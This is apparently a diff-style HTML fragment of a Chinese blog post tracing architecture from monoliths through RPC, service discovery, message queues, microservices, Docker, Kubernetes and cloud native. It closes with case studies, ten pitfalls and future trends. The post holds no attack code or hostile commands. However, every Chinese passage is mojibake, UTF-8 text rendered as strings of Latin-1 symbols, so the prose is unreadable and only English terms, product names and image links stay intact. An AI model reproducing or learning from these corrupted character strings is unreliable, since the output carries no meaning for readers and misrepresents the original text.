+<p>ããããææåè½ä»£ç å¨é¨å å¨ä¸ä¸ªé¡¹ç®éââè¿å°±æ¯æè°ç<strong>"åä½åºç¨"</strong>ï¼Monolithï¼ãéº»ç¦ä¹æåæ¾å¤§ï¼</p>
+<p>ããããæ¹ä¸è¡ç¨æ·æ¨¡åçä»£ç ï¼<strong>æ´ä¸ªåºç¨è¦å¨éåå¸ã</strong>å åä¸ªå¼ååæ¶æ¹åä¸ä¸ªä»£ç ä»åºï¼å¤©å¤©å²çªãå¤©å¤©å ç­è§£å³åå¹¶å²çªãè®¢åæ¨¡åæ³å æºå¨æ©å®¹ï¼<strong>æ´ä¸ªåºç¨è·çä¸èµ·æ©</strong>ââææåªæè®¢åæ¨¡åå¿ï¼å´è¦æµªè´¹å¤§éèµæºå»æ©æ ¹æ¬ä¸å¿çç¨æ·æ¨¡åã</p>
+<p>ãã<strong>æä¹åï¼æï¼</strong></p>
+<p>ããããä½ æç§ä¸å¡è¾¹çï¼æè¿ä¸ªå·¨å¤§çåºç¨ä¸åä¸ååå¼ï¼ç¨æ·æ¨¡åç¬ç«æç¨æ·ç³»ç»ï¼ååæ¨¡åç¬ç«æååç³»ç»ï¼è®¢åæ¨¡åç¬ç«æè®¢åç³»ç»ãæ¯ä¸ªç³»ç»èªæä¸ä½ââ<strong>ç¬ç«é¨ç½²ãç¬ç«åå¸ãç¬ç«æ©å®¹ï¼è°ä¹ä¸å½±åè°ã</strong></p>
+<p>ããããä½ ç»è¿å¥æ¶æååå«<strong>"åå¸å¼æ¶æ"</strong>ã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005109815-252627734.png" alt="d_09_distributed" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã11ãRPC è¿ç¨è°ç¨ ââ æååçæå¡ï¼æä¹äºç¸"æçµè¯"ï¼</h2>
+<p>ããããç¨æ·ä¸è®¢åçæ¶åï¼è®¢åç³»ç»éè¦æ¥åååºå­ï¼ååç³»ç»ï¼ãæ£ä½é¢ï¼ç¨æ·ç³»ç»ï¼ãçæè®¢åï¼è®¢åç³»ç»ï¼ãè¿ä¸å ç³»ç»é½åå¼äºï¼<strong>ç¸äºä¹é´æä¹è°ç¨ï¼æä¹éä¿¡ï¼</strong></p>
+<p>ããããè§£å³æ¹æ¡å¾ç´æ¥ï¼è®©è·¨æºå¨çæå¡è°ç¨<strong>åè°æ¬å°æ¹æ³ä¸æ ·ç®åã</strong>ä½ åæäºä¸å¥æºå¶ââè°ç¨æ¹ææ¹æ³åååæ°åºååæäºè¿å¶æ°æ®ï¼éè¿ç½ç»åç»ç®æ æå¡ï¼ç®æ æå¡ååºåååæ§è¡ï¼æç»æåºååååæ¥ãæ´ä¸ªè¿ç¨å¯¹ç¨åºåéæï¼è°ç¨è¿ç¨æå¡å°±åè°ç¨æ¬å°å½æ°ã</p>
+<p>ããããä½ ç»å®ååå«<strong>"RPC"ï¼Remote Procedure Callï¼è¿ç¨è¿ç¨è°ç¨ï¼</strong>ã.NET çæéæ gRPCãWCFï¼Java çæéæ DubboãSpring Cloudãåçé½ä¸æ ·ââ<strong>è®©è¿ç¨è°ç¨çèµ·æ¥åæ¬å°è°ç¨ã</strong></p>
+<p>ããããä½æå¡è¶æ¥è¶å¤ï¼äºç¸è°ç¨çé¾è·¯è¶æ¥è¶å¤æãè®¢åè°ç¨ååï¼ååè°ç¨åºå­ï¼åºå­è°ç¨ç©æµâ¦â¦<strong>æä¹å¿«éæ¾å°è¦è°çç®æ ï¼</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005134856-1281963707.png" alt="d_10_rpc" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã12ãæå¡æ³¨åä¸åç° ââ å ç¾ä¸ªæå¡ï¼è°ç¥éè°å¨åªï¼</h2>
+<p>ããããæå¡æ°éçç¸å¼å¢é¿ï¼å ç¾ä¸ªæå¡äºç¸è°ç¨ï¼æ¯ä¸ªæå¡ç IP å°åå¯è½éæ¶ååï¼æ©å®¹äºãç¼©å®¹äºãæäºéå¯äºï¼ã<strong>ä¸å¯è½é æé IP æ¥åæå¡è°ç¨äºã</strong></p>
+<p>ããããäºæ¯ä½ åæäºä¸ä¸ª<strong>"æ»ç®¡å®¶"</strong>ï¼</p>
+<p>ãããã<strong>æ³¨åä¸­å¿ï¼Consul / Nacos / Eurekaï¼</strong>ï¼æææå¡å¯å¨æ¶ï¼ä¸»å¨å°æ³¨åä¸­å¿æ¥å°ââ"ææ¯è®¢åæå¡ï¼æä½å¨ 192.168.1.100:8080ï¼æç®åå¥åº·"ãè¿ä¸ªè¿ç¨å«<strong>æå¡æ³¨å</strong>ã</p>
+<p>ããããå½ä¸ä¸ªæå¡éè¦è°ç¨å¦ä¸ä¸ªæå¡æ¶ï¼å®åé®æ³¨åä¸­å¿ï¼"è®¢åæå¡å¨åªï¼"æ³¨åä¸­å¿è¿åå¯ç¨å°ååè¡¨ãè¿ä¸ªè¿ç¨å«<strong>æå¡åç°</strong>ã</p>
+<p>ããããæ³¨åä¸­å¿è¿ä¼å®ææ£æ¥æ¯ä¸ªæå¡æ¯å¦å¥åº·ï¼å¿è·³æ£æµï¼ãå¦ææä¸ªæå¡æäºï¼æ³¨åä¸­å¿æå®ä»å¯ç¨åè¡¨éææï¼è°ç¨æ¹èªå¨åæ¢å°å¶ä»å¥åº·å®ä¾ã<strong>è¿ä¸åå¯¹ä¸å¡ä»£ç å®å¨éæã</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005148435-301721602.png" alt="d_11_discovery" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã13ãæ¶æ¯éå ââ å«åæ­»ç­äºï¼å¼æ­¥å§</h2>
+<p>ããããæå¡ä¹é´äºç¸è°ç¨è¿æä¸ä¸ªè´å½é®é¢ï¼<strong>äºç¸ç­å¾ã</strong></p>
+<p>ããããè®¢åæå¡è°ç¨åºå­æå¡ï¼åºå­æå¡è°ç¨ç©æµæå¡ï¼ç©æµæå¡è°ç¨ç­ä¿¡æå¡â¦â¦ä¸æ¡é¾è·¯ä¸æ¥ï¼<strong>ä¸ä¸ªæå¡å¡ä½ï¼æ´æ¡é¾è·¯é½è·çå µæ­»ã</strong>æµéä¸é«ï¼éªå´©éæ¶å¯è½åçã</p>
+<p>ããããæä¹åï¼è½ä¸è½<strong>ä¸äºç¸ç­å¾ï¼</strong>ä½ åæäºä¸ä¸ªè¶å¤§å®¹éç<strong>"æºè½æ¶ä»¶ç®±"ââæ¶æ¯éåï¼RabbitMQ / Kafkaï¼ã</strong></p>
+<p>ããããæå¡ä¹é´ä¸åç´æ¥è°ç¨ï¼èæ¯éè¿æ¶æ¯éåæ¥ä¼ éæ¶æ¯ï¼åéæ¹ææ¶æ¯æè¿éåå°±å®äºï¼ç»§ç»­å¹²èªå·±çæ´»ãæ¥æ¶æ¹ä»ä¹æ¶åæç©ºä»ä¹æ¶åæ¥æ¿ãåæ¹<strong>å½»åºè§£è¦ã</strong></p>
+<p>ããããè¿å¸¦æ¥äºä¸ä¸ªå·¨å¤§å¥½å¤ï¼</p>
+<p>ãããã<strong>åå³°å¡«è°·</strong>ï¼æµéæ´ªå³°æ¥æ¶ï¼æ¶æ¯åè¿éåæéï¼ä¸æ¸¸æå¡æèªå·±çèå¥æ¢æ¢æ¶è´¹ï¼ä¸ä¼è¢«å²å®ã</p>
+<p>ãããã<strong>æç»ä¸è´æ§</strong>ï¼è°ç¨å¤±è´¥ï¼æ¶æ¯è¿å¨éåéä¸ä¼ä¸¢ï¼ç­æ¥æ¶æ¹æ¢å¤äºæ¥çå¤çã</p>
+<p>ãããã<strong>å¼æ­¥è§£è¦</strong>ï¼åéæ¹ä¸ç¨ç­æ¥æ¶æ¹åå¤ï¼ç´æ¥è¿åç»ç¨æ·"è®¢åå·²æäº¤"ï¼åå°å¼æ­¥å¤çã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005207399-1818803199.png" alt="d_12_mq" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã14ãå¾®æå¡æ¶æ ââ ä¸ä¸ªæå¡åªå¹²ä¸ä»¶äº</h2>
+<p>ããããåå¸å¼æ¶æè·äºä¸æ®µæ¶é´ï¼ä½ åç°è¿æ¯æå¾ä¸å¤ç»ã</p>
+<p>ããããå°±æ¿ç¨æ·ç³»ç»æ¥è¯´ï¼éé¢åè£ç»å½ãåè£ä¸ªäººä¿¡æ¯ãåè£ä¼åç­çº§ãåè£æ¶è´§å°åââè¿æ¯ä¸å¤§å¨ãä¸åå¢éçéæ±ä¸ä¸æ ·ï¼å¢é¿å¢éæ³ä¼åæ³¨åæµç¨ï¼æ¯ä»å¢éæ³ä¼åå®åè®¤è¯ââ<strong>æ¤å¨åä¸ä¸ªç³»ç»éï¼è°é½å¨ä¸äºã</strong></p>
+<p>ããããäºæ¯ä½ ç»§ç»­æï¼æç§ä¸ä¸ªæ´æç«¯çååï¼<strong>ä¸ä¸ªæå¡åªå¹²ä¸ä»¶äºï¼Single Responsibilityï¼ã</strong></p>
+<p>ããããç»å½åæä¸ä¸ªç¬ç«æå¡ãä¼ååæä¸ä¸ªç¬ç«æå¡ãå°ååæä¸ä¸ªç¬ç«æå¡ãæ¯ä¸ªæå¡æèªå·±çæ°æ®åºãèªå·±çä»£ç ä»åºãèªå·±çé¨ç½²æµæ°´çº¿ã<strong>ä»ä»¬è½ç¬ç«å¼åãç¬ç«åå¸ãç¬ç«æ©å®¹ãæ³ç¨ä»ä¹ææ¯æ å°±ä»ä¹ææ¯æ ââç»å½ç¨ .NET 8 Minimal APIï¼ä¼åç¨ Java Spring Bootï¼å¨é½ä¸å½±åã</strong></p>
+<p>ããããä½ ç»è¿å¥æ´æè´çæ¶æååå«<strong>"å¾®æå¡æ¶æ"</strong>ã</p>
+<p>ããããç­é¨æå¡ï¼è®¢åãæ¯ä»ï¼ç´æ¥å¤é¨ç½²å å°å æºå¨ææµéãå·é¨æå¡ä¸å¨å°±è¡äºï¼èµæºä¸ç¹ä¸æµªè´¹ãåªä¸ªæå¡æäºï¼åªå½±åé£ä¸å°ååè½ï¼<strong>ç»å¯¹ä¸ä¼æ´ä¸ªç½ç«å´©æã</strong>å¤ä¸ªå¢éåç®¡åçæå¡ï¼äºä¸ææ°ï¼å¼åæçç´æ¥èµ·é£ã</p>
+<p>ããããå½ç¶ï¼æå©å°±æå¼ï¼æå¡å¤ªå¤äºï¼è°ç¨å³ç³»ä¹±å¦éº»ï¼åºé®é¢æ ¹æ¬æ¾ä¸å°æ ¹å ãäºæ¯ä½ åå äº<strong>å¨é¾è·¯è¿½è¸ªï¼Jaeger / Zipkinï¼ãæ¥å¿èåï¼ELKï¼ãææ çæ§ï¼Prometheus + Grafanaï¼</strong>ââå¯è§æµæ§ä¸ä»¶å¥æ­£å¼ç»åºã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005238750-1433834438.png" alt="d_13_microservices" loading="lazy"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã15ãDocker å®¹å¨ ââ "æçµèä¸è½è·ï¼æå¡å¨ä¸ä¸ºä»ä¹ä¸è¡ï¼"</h2>
+<p>ããããå¾®æå¡å¥½ç¨ï¼ä½è¿ç»´å¢éå­äºãåæ¥å ä¸ªåºç¨ï¼ä¸ä¸åæå ç¾ä¸ªå¾®æå¡ã<strong>æ¯ä¸ªæå¡ä¸çº¿é½è¦è£ç¯å¢ãéä¾èµãè°åæ°ââç¨å¾®ä¸ä¸æ ·å°±å¯å¨ä¸äºã</strong>"æçµèä¸è½è·åï¼"æäºå¼åä¸è¿ç»´ä¹é´æå¸¸è§çäºåµã</p>
+<p>ããããå¤§ä¿åè¦ç´§æ¥æ©å®¹å ç¾å°æºå¨ââä¸å°ä¸å°éç¯å¢ï¼<strong>ç­éå®ï¼å¤§ä¿æ©ç»æäºã</strong>å¤§ä¿ç»æè¦ç¼©å®¹ï¼è¿å¾ä¸å°ä¸å°æ¸ç¯å¢ââæçä½å°ä»¤äººåæã</p>
+<p>ããããæä¹åï¼ä½ åçµæºä¸å¨ï¼<strong>è½ä¸è½ææå¡åå®éè¦çè¿è¡ç¯å¢ï¼ä¸èµ·æåæä¸ä¸ªå¯å°çå­ï¼</strong>æ¾å°ä»»ä½ä¸å°æå¡å¨ä¸ï¼ç´æ¥è·å°±è¡ï¼</p>
+<p>ããããäºæ¯ä½ åæäº<strong>å®¹å¨ï¼Dockerï¼</strong>ï¼ææ¯ä¸ªå¾®æå¡çä»£ç ãä¾èµãéç½®ãè¿è¡ç¯å¢å¨é¨æåæä¸ä¸ªéåï¼Imageï¼ãéåä¸æ¬¡æå»ºï¼å°å¤è¿è¡ï¼Build Once, Run Anywhereï¼ã</p>
+<p>ãããã<strong>ç¯å¢ä¸ä¸è´è¿ä¸ªä¸çºªé¾é¢ï¼è¢«ä¸ä¸ªéè£ç®±å½»åºè§£å³äºã</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005306708-2040590540.png" alt="d_14_docker" loading="lazy"></p>
+<p>ããããä½æ°é®é¢åæ¥äºï¼å ç¾ä¸åä¸ªå®¹å¨ï¼<strong>è°å¸®ä½ ç®¡å¢ï¼</strong>&nbsp;</p>
+<h2 id="pTitle">ãã16ãKubernetes ç¼æ ââ è¯·æ¥ä¸ªå¨è½å¤§ç®¡å®¶</h2>
+<p>ããããå ç¾ä¸åä¸ªå®¹å¨ï¼åå¸å¨å åå°æºå¨ä¸ãè°ç®¡åªäºå®¹å¨è·å¨åªå°æºå¨ä¸ï¼å®¹å¨æäºè°éå¯ï¼æµéé«äºè°å å®¹å¨ï¼æµéä½äºè°ç¼©å®¹å¨ï¼</p>
+<p>ããããä½ åè¯·æ¥ä¸ä¸ª<strong>"å¨è½å¤§ç®¡å®¶"</strong>ââä½ ç»å®ååå«<strong>"Kubernetes"ï¼K8Sï¼</strong>ã</p>
+<p>ããããK8S å¹²äºåä»¶è®©ä½ å½»åºè§£æ¾çäºï¼</p>
+<p>ãããã<strong>èªå¨æ©ç¼©å®¹</strong>ï¼æµéé«äºèªå¨å å®¹å¨ï¼HPAï¼ï¼æµéä½äºèªå¨ç¼©åãåå¤æ²¡äººè®¿é®æ¶ï¼èªå¨ç¼©å°æå°å®ä¾ï¼çé±ã</p>
+<p>ãããã<strong>èªå¨æ¢å¤</strong>ï¼å®¹å¨æäºï¼K8S èªå¨éå¯ä¸ä¸ªæ°çãæºå¨æäºï¼K8S èªå¨æä¸é¢çå®¹å¨è°åº¦å°å«çå¥åº·æºå¨ä¸ã</p>
+<p>ãããã<strong>æå¡åç° + è´è½½åè¡¡</strong>ï¼K8S åç½® Service å Ingressï¼èªå¨åæå¡åç°åæµéååã</p>
+<p>ãããã<strong>æ»å¨æ´æ° + åæ»</strong>ï¼åæ°çæ¬æ¶ï¼K8S ä¸ä¸ªå®¹å¨ä¸ä¸ªå®¹å¨å°æ¿æ¢ï¼ç¨æ·å®å¨ä¸æç¥ãæ°çæ¬æé®é¢ï¼ä¸é®åæ»ã</p>
+<p>ããããå¨ç¨ä¸éè¦ä½ æå¨æä½ââ<strong>å£°æå¼ç®¡ç</strong>ï¼ä½ åè¯ K8S "æè¦ 5 ä¸ªè®¢åæå¡å®ä¾"ï¼K8S èªå·±å»æ³åæ³ç»´æè¿ä¸ªç¶æã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005227034-1927030282.png" alt="d_15_k8s" loading="lazy"></p>
+<p>&nbsp;</p>
+<p>ããããä½ç­ç­ââå°±ç®æäº K8Sï¼ä½ è¿æ¯å¾èªå·±ä¹°æå¡å¨ãç®¡çæºæ¿ãéç½ç»ãæå®¹ç¾å¤ä»½â¦â¦<strong>æå¡å¨è¿è¦èªå·±ä¹°ï¼å¤ªæµªè´¹é±äºã</strong></p>
+<h2 id="pTitle">ãã17ãäºåç ââ ææå¡å¨"éèº«"äº</h2>
+<p>ããããä½ ç´æ¥æç³»ç»æ¬å°äºäºå¹³å°ï¼é¿éäº / Azure / AWSï¼ã</p>
+<p>ãããã<strong>äºå¹³å°å±ç¶æ¯ä¸ä¸ªæ éå¤§çèµæºæ± ï¼</strong>è¦å¤å° CPUï¼éæ¶ç³è¯·éæ¶æãè¦å¤å°åå­ï¼éæ¶ç³è¯·éæ¶ç¨ãç¨å®å°±éæ¾ï¼<strong>æéä»è´¹ã</strong></p>
+<p>ããããåºå±æºæ¿ãç½ç»ãç¡¬ä»¶ââå¨é¨ç±äºååæå®ãä½ çç³»ç»å½»åºåæäº"é¿å¨äºä¸ççç©"ââå¼¹æ§ä¼¸ç¼©ãæéä»è´¹ãå¨çé¨ç½²ãæç®¡æå¡ãä½ ç»å®ååå«<strong>"äºåç"</strong>ã</p>
+<p>ããããä»æå¼å§ç<strong>ä¸å°å°æå¡å¨</strong>ï¼å°å¦ä»<strong>å¼¹æ§ãèªå¨åãé«å¯ç¨ãæ éæ©å±çäºåçæ¶æ</strong>ãä¸ç®¡ä¸å¡æä¹æ¶¨ãæµéæä¹æ´ï¼å®é½è½ç¨³ç¨³æä½ã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005413399-1325074625.png" alt="d_16_cloudnative" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã18ãæ»ç» ââ æ¶ææ¼è¿çä¸å¤§æ ¸å¿æç»´</h2>
+<p>ããããæäºè®²å®äºãä»ä¸å°æå¡å¨å°åä¸çº§å¹¶åï¼æ¯ä¸æ­¥é½ä¸æ¯æèè¢æ³åºæ¥çââ<strong>æ¯ä¸æ­¥é½æ¯å¨è§£å³ä¸ä¸ªçå®çãç«ç§çæ¯çé®é¢ã</strong></p>
+<p>ãããã17 ä¸ªé¶æ®µï¼æ¯ä¸ªé¶æ®µè§£å³ä¸ä¸ªç¹å®çç¹ï¼</p>
+<p>ããããåæº â&nbsp;<strong>ä»æ å°æ</strong>&nbsp;| åºç¨ä¸æ°æ®åºåç¦» â&nbsp;<strong>è§£å³èµæºäºå¤º</strong>&nbsp;| éç¾¤ + è´è½½åè¡¡ â&nbsp;<strong>è§£å³é«å¹¶å</strong>&nbsp;| ç¼å­ â&nbsp;<strong>è§£å³æ¥è¯¢æ§è½</strong>&nbsp;| è¯»ååç¦» â&nbsp;<strong>è§£å³æ°æ®åºè¯»åå</strong>&nbsp;| ååºåè¡¨ â&nbsp;<strong>è§£å³æµ·éå­å¨</strong>&nbsp;| CDN + ååä»£ç â&nbsp;<strong>è§£å³è®¿é®éåº¦ä¸å®å¨</strong>&nbsp;| æç´¢å¼æ + ES â&nbsp;<strong>è§£å³å¤ææ¥è¯¢</strong>&nbsp;| æå¡æå â&nbsp;<strong>è§£å³ä¸å¡è¦å</strong>&nbsp;| RPC â&nbsp;<strong>è§£å³è¿ç¨éä¿¡</strong>&nbsp;| æå¡æ³¨ååç° â&nbsp;<strong>è§£å³æå¡å¯»å</strong>&nbsp;| æ¶æ¯éå â&nbsp;<strong>è§£å³åæ­¥ç­å¾</strong>&nbsp;| å¾®æå¡ â&nbsp;<strong>è§£å³å¢éåä½ä¸å¼¹æ§</strong>&nbsp;| Docker â&nbsp;<strong>è§£å³ç¯å¢ä¸è´æ§</strong>&nbsp;| K8S â&nbsp;<strong>è§£å³å®¹å¨ç¼æ</strong>&nbsp;| äºåç â&nbsp;<strong>è§£å³è¿ç»´ææ¬</strong></p>
+<p>ããããæåéä½ <strong>ä¸æ¡æ¶ææ¼è¿çæ ¸å¿æç»´</strong>ââè¿æ¯æ´ç¯æç« æå¼é±çä¸å¥è¯ï¼</p>
+<p>ãããã<strong>ç¬¬ä¸æ¡ï¼æ²¡ææå¥½çæ¶æï¼åªææéåä¸å¡çæ¶æã</strong>ååå¬å¸å«ä¸æ¥å°±å¾®æå¡ï¼åæºè·å¾å¨å°±åæºè·ãè®©ä¸å¡æ¨çæ¶æèµ°ï¼å«è®©æ¶ææçä¸å¡æ­»ãè¿æ©ä¼åæ¯ä¸æ¶ä¹æºã</p>
+<p>ãããã<strong>ç¬¬äºæ¡ï¼æ¶ææ¼è¿çæ¬è´¨ï¼æ¯ç¨ç©ºé´æ¢æ¶é´ï¼ç¨å¤æåº¦æ¢æ§è½ã</strong>å æºå¨ãå ç»ä»¶ãåå±åçââææè±æ´»æç»é½æ¯ä¸ºäºæä½æ´å¤§çæµéãæ¯ææ´é«çå¹¶åãä½ çç³»ç»æ¯å¤ä¸å±ï¼èåé½æä¸ä¸ªæ¾ç»è¢«æè¶´ä¸çç¨åºåã</p>
+<p>ãããã<strong>ç¬¬ä¸æ¡ï¼æ°¸è¿ä¸ºäºäºå¤§ç®æ ââé«æ§è½ãé«å¯ç¨ãå¯ä¼¸ç¼©ãå¯æ©å±ãå¤å®å¨ã</strong>ä»»ä½ä¸ä¸ªæ¶æå³ç­ï¼é®èªå·±ï¼å®è®©ç³»ç»æ´å¿«äºåï¼æ´ç¨³äºåï¼æ´å®¹ææ©å®¹äºåï¼æ´å®¹æå åè½äºåï¼æ´å®å¨äºåï¼</p>
+<p>ããããä»ä¸å°å°æå¡å¨å°åä¸çº§å¹¶åçäºåçæ¶æï¼<strong>æ¯ä¸æ­¥é½æè¿¹å¯å¾ªï¼æ¯ä¸æ­¥é½å¨è§£å³çå®é®é¢ã</strong>æ¶æä¸æ¯é¶å¼¹ï¼æ¶ææ¯ç¬åºæ¥çã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005439058-251403857.png" alt="d_17_summary" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã19ãç°å®ä¸ççéªè¯ ââ è°åå¯¹äºï¼è°åéäº</h2>
+<p>ããããè®²å®äºçè®ºï¼æä»¬æ¥çå ä¸ªçå®æ¡ä¾ãæ¶æéåä¸æ¯çº¸ä¸è°åµââåå¯¹äºååéäºï¼ç»æå¤©å·®å°å«ã</p>
+<p>ãããã<strong>åå¯¹çï¼Netflix ç CQRS æ¼è¿ã</strong>Netflix çç²ä¸ç½ç« Tudumï¼ææ´» ~2000 ä¸ï¼æåç¨ Kafka + Cassandra ç CQRS æ¶æãä½éçåå®¹è§æ¨¡å¢é¿ï¼æ°æ®ä¸è´æ§å»¶è¿è®©ç¼è¾é¢è§è¦ç­æ°åéãä»ä»¬ææ´ä¸ªæ¶æè¿ç§»å°èªç çåå­æ°æ®åº RAW Hollowï¼130MB åå­è£ä¸ 3 å¹´æ°æ®ï¼åç¼©ç 75%ï¼ï¼é¦é¡µæå»ºä» 1.4 ç§éå° 0.4 ç§ãæ ¸å¿ç»éªï¼<strong>"CQRS æ¯å¼ºå¤§çæ©å±èå¼ï¼åææ¯ä½ è½å®¹å¿æç»ä¸è´æ§ãIO æ¯æ§è½çå¤´å·æäººã"</strong></p>
+<p>ãããã<strong>åå¯¹çï¼æå»çå¹³å°çé¢åé©±å¨æåã</strong>ä¸å®¶å»ç IT å¬å¸æ DDD éçä¸ä¸æå°æ£èç®¡çç³»ç»æåæ 18 ä¸ªå¾®æå¡ãå¼åå¨æä» 12 å¨ç¼©å° 3 å¨ï¼ä¸å¡ä¸ IT å¯¹é½åº¦æå 67%ãå³é®å¨äºââä»ä»¬æ¯ååé¢åå»ºæ¨¡ï¼åææå¡ï¼èä¸æ¯ä¸ºæèæã</p>
+<p>ãããã<strong>åéçï¼6 äººå¢éçè¿åº¦å·¥ç¨åã</strong>ä¸ä¸ªåªæ 6 ä¸ªå¼åèçåä¸å¢éï¼å¨ä¸å¡è¿æ²¡è·éæ¶å°±ä¸äº Kafka + äºä»¶æº¯æº + CQRS å¨å¥ãç»æï¼å¹³åååºæ¶é´ä» 150ms æ¶¨å° 2.1 ç§ï¼æ¢ 14 åï¼ï¼åºç¡è®¾æ½ææ¬ä» $400/ææ¶¨å° $2,450/æï¼æ¶¨ 6 åï¼ï¼æ¯æäº¤ä»åè½ä» 12-15 ä¸ªéå° 3-4 ä¸ªï¼é 75%ï¼ï¼æ°äººé¦æ¬¡æäº¤ä»£ç æ¶é´ä» 2 å¤©åæ 2 å¨ãæåä»ä»¬éåæ¨¡åååä½ï¼ä¸åæ¢å¤æ­£å¸¸ã<strong>æè®­æ¨çï¼äºä»¶é©±å¨æ¶ææ¯ç»ç»æ©å±çä¼åææ®µï¼ä¸æ¯ææ¯æ©å±çä¼åææ®µã8 ä¸ªäººçå¢éæ ¹æ¬æ²¡æç»ç»æ©å±é®é¢ã</strong></p>
+<h2 id="pTitle">ãã20ãå¸¸è§é·é± ââ åæ¡è¡æ³ªæè®­</h2>
+<p>ããããæ»ç»äºçå®é¡¹ç®ä¸­æ¶ææ¼è¿æå®¹æè¸©çåä¸ªåï¼</p>
+<p>ãããã<strong>1. å¤§çç¸å¼éåï¼Big Bang Rewriteï¼</strong>ââ ä¸æ¬¡æ§ææ´ä¸ªåä½éåæå¾®æå¡ãæåçæä½ãæ­£ç¡®åæ³ï¼ç¨<strong>ç»æèæ¨¡å¼ï¼Strangler Figï¼</strong>æ¸è¿æ¿æ¢ï¼æ°æ§ç³»ç»å¹¶è¡è¿è¡ï¼éæ­¥è¿ç§»æµéã</p>
+<p>ãããã<strong>2. è¿åº¦å·¥ç¨å</strong>ââ 6 äººå¢éä¸ K8S + Kafka + Istio + CQRS + äºä»¶æº¯æºã"ä¸ä¸å°æ¥æµéå¤§äºå¢ï¼"ç­æµéççå¤§äºåè¯´ãæ¯é¡¹ææ¯å³ç­é½è¦éå ROIã</p>
+<p>ãããã<strong>3. æäºä»£ç ä½æ²¡ææ°æ®åº</strong>ââ å¤ä¸ªå¾®æå¡å±äº«ä¸ä¸ªæ°æ®åºï¼è¿æ¯æè´å½çå¾®æå¡åæ¨¡å¼ãæ¯ä¸ªæå¡å¿é¡»æ¥æèªå·±çæ°æ®å­å¨ã</p>
+<p>ãããã<strong>4. æ²¡æå¯è§æµæ§å°±ææå¡</strong>ââ åå»ºçæ§ï¼Prometheus + Grafanaï¼ãæ¥å¿ï¼ELKï¼ãè¿½è¸ªï¼Jaegerï¼ï¼åææå¡ãå¦åä¸çº¿ååºé®é¢ä½ è¿åªéåºé®é¢é½ä¸ç¥éã</p>
+<p>ãããã<strong>5. å¾®æå¡ç²åº¦ä¸å¯¹</strong>ââ è¦ä¹å¤ªç²ï¼æäºè·æ²¡æä¸æ ·ï¼ï¼è¦ä¹å¤ªç»ï¼å ç¾ä¸ªçº³ç±³æå¡ï¼ãååï¼ä¸ä¸ªæå¡åºè¯¥è½å¨ä¸¤å¨åå®å¨éåã</p>
+<p>ãããã<strong>6. ç²ç®è¿½æ°ææ¯</strong>ââ ä»å¹´ Service Meshï¼æå¹´ eBPFï¼åå¹´ Serverlessãææ¯æ¯ä¸ºä¸å¡æå¡çï¼ä¸æ¯åè¿æ¥ã</p>
+<p>ãããã<strong>7. ææ¯æ¶æåäºï¼ä½ç»ç»æ¶ææ²¡å</strong>ââ åº·å¨å®å¾ï¼ç³»ç»æ¶ææ¯ç»ç»æ²éç»æçéåãä¸å¾®æå¡ä¹åï¼åæå¢éæä¸å¡åéç»ã</p>
+<p>ãããã<strong>8. å®å¨æ¯æåæèèç</strong>ââ ä¸çº¿ååç°æ¼æ´ï¼æè¡¥ä¸ãæ­£ç¡®åæ³ï¼DevSecOpsï¼å®å¨æ«æéæå° CI/CD æµæ°´çº¿éã</p>
+<p>ãããã<strong>9. API æ²¡æçæ¬ç®¡ç</strong>ââ æ¹äºæ¥å£ä¸éç¥è°ç¨æ¹ï¼ä¸æ¸¸å¨æãåæ API First è®¾è®¡ï¼ä¸¥æ ¼çæ¬ç®¡çã</p>
+<p>ãããã<strong>10. è®¤ä¸ºä¸äºäºå°±ä¸äºå¤§å</strong>ââ æåä½ç´æ¥æ¬ä¸äºï¼Lift &amp; Shiftï¼ï¼æ²¡æåä»»ä½äºåçæ¹é ãç»ææ¯ï¼è¿æ¯å¨äºä¸è·åä½ï¼åªæ¯è´¦åè´µäº 3 åã</p>
+<h2 id="pTitle">21ã æ¥ä¸æ¥å¾åªèµ°</h2>
+<p>ããããæ¶ææ¼è¿æ²¡æç»ç¹ãä»¥ä¸å ä¸ªæ¹åæ­£å¨å¡é æªæ¥ï¼</p>
+<p>ãããã<strong>AIOps æºè½è¿ç»´</strong>ï¼åºäºå¤§æ¨¡åçå¼å¸¸æ£æµè¦ç 90% è¿ç»´åºæ¯ï¼é¢æµæ§èªå¨æ©å®¹ãä½ ä¸åç¯ç Grafana ä»ªè¡¨çââAI å¸®ä½ çï¼å®åç°å¼å¸¸ç´æ¥è§¦åæ©å®¹æéçº§ã</p>
+<p>ãããã<strong>Serverless 2.0</strong>ï¼ç»å Knative æéå¯å¨ï¼é²ç½®èµæºææ¬éä½ 80%ãå½æ°è®¡ç®ä¸ååªæ¯å¤çå¾çââæ ç¶æå¾®æå¡é½å¯ä»¥ Serverless åã</p>
+<p>ãããã<strong>eBPF å¯è§æµæ§é©å½</strong>ï¼æ éä¿®æ¹ä»£ç å³å¯å®ç°åæ ¸çº§çæ§ï¼æéå®ä½æ¶é´ç¼©ç­ 90%ãSidecar æ³¨å¥å¯è½æä¸ºåå²ã</p>
+<p>ãããã<strong>å¹³å°å·¥ç¨ï¼Platform Engineeringï¼</strong>ï¼å¼åèä¸åç´æ¥é¢å¯¹ K8S YAML å Helm Chartï¼èæ¯éè¿èªæå¡é¨æ·ä¸é®é¨ç½²ãåé¨å¼åèå¹³å°ï¼IDPï¼æ­£å¨æä¸ºå¤§ä¸­åå¢éçæ éã</p>
